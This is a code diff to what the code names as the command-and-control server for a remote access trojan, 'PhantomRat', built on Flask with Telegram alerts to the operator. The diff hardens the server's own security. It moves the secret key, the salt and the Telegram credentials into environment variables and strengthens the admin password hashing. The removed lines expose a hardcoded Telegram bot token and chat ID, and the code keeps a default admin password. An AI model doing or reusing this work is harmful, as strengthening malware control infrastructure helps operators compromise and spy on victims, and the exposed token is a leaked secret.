@@ -19,9 +19,10 @@ from functools import wraps
 import requests
 import random
 from datetime import datetime, timedelta
+from werkzeug.security import check_password_hash as werkzeug_check_password_hash, generate_password_hash
 
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'e4850f012d54d170077a91b8f02e60ca64e6a2c7a6d5bad5'
+app.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY') or os.urandom(48).hex()
 app.config['DATABASE'] = 'phantom_c2.db'
 app.config['SESSION_TYPE'] = 'filesystem'
 
@@ -30,8 +31,49 @@ with open('malleable_profile.json', 'r') as f:
     PROFILE = json.load(f)
 
 ENCRYPTION_KEY = b"phantomrat_32_char_encryption_key_here"
-KDF_SALT = b"phantomrat_kdf_salt"
+KDF_SALT_FILE = os.path.join(os.path.dirname(__file__), 'phantomrat_kdf_salt.bin')
 KDF_ITERATIONS = 200_000
+
+
+def load_kdf_salt():
+    """Load a deployment-unique KDF salt, generating and persisting if missing."""
+    env_salt = os.environ.get("PHANTOM_KDF_SALT")
+    if env_salt:
+        try:
+            return bytes.fromhex(env_salt) if all(c in '0123456789abcdefABCDEF' for c in env_salt) else env_salt.encode()
+        except Exception:
+            pass
+
+    if os.path.exists(KDF_SALT_FILE):
+        try:
+            with open(KDF_SALT_FILE, 'rb') as salt_file:
+                data = salt_file.read()
+                if data:
+                    return data
+        except Exception:
+            pass
+
+    profile_salt = PROFILE.get('encryption', {}).get('salt')
+    if profile_salt:
+        if not isinstance(profile_salt, (bytes, bytearray)):
+            profile_salt = str(profile_salt).encode()
+        try:
+            with open(KDF_SALT_FILE, 'wb') as salt_file:
+                salt_file.write(profile_salt)
+        except Exception:
+            pass
+        return profile_salt
+
+    generated_salt = os.urandom(32)
+    try:
+        with open(KDF_SALT_FILE, 'wb') as salt_file:
+            salt_file.write(generated_salt)
+    except Exception:
+        pass
+    return generated_salt
+
+
+KDF_SALT = load_kdf_salt()
 def derive_fernet_key(secret: bytes) -> bytes:
     """Derive a Fernet-compatible key using PBKDF2-HMAC-SHA256."""
     if not isinstance(secret, (bytes, bytearray)):
@@ -72,8 +114,8 @@ def load_encryption_key():
 FERNET_KEY = derive_fernet_key(load_encryption_key())
 CIPHER = Fernet(FERNET_KEY)
 
-BOT_TOKEN = '8441637477:AAF4yVWTmXniWE8WYdkLiS5WAsd0vE43qk4'
-CHAT_ID = '7279310150'
+BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
+CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
 
 # Color scheme for PhantomRat
 RAT_COLORS = ['#1a1a2e', '#16213e', '#0f3460', '#e94560']
@@ -92,20 +134,22 @@ def login_required(f):
 # ============= FIX: ADD MISSING HELPER FUNCTIONS =============
 def check_password_hash(stored_hash, password):
     """Check if password matches stored hash"""
-    return hashlib.sha256(password.encode()).hexdigest() == stored_hash
+    return werkzeug_check_password_hash(stored_hash, password)
 
 def encrypt_data(data):
     """Encrypt data for transmission"""
     try:
         return CIPHER.encrypt(json.dumps(data).encode())
-    except:
-        return b''
+    except Exception as e:
+        print(f"[!] Encryption error: {e}")
+        raise
 
 def decrypt_data(encrypted_data):
     """Decrypt received data"""
     try:
         return json.loads(CIPHER.decrypt(encrypted_data).decode())
-    except:
+    except Exception as e:
+        print(f"[!] Decryption error: {e}")
         return None
 
 def send_telegram(message):
@@ -370,8 +414,8 @@ def init_db():
         # Add default admin user if not exists
         existing = db.execute('SELECT COUNT(*) as count FROM users WHERE username = ?', ('admin',)).fetchone()
         if existing['count'] == 0:
-            password_hash = hashlib.sha256('phantomrat'.encode()).hexdigest()
-            db.execute('INSERT INTO users (username, password_hash) VALUES (?, ?)', 
+            password_hash = generate_password_hash('phantomrat')
+            db.execute('INSERT INTO users (username, password_hash) VALUES (?, ?)',
                       ('admin', password_hash))
         
         db.commit()
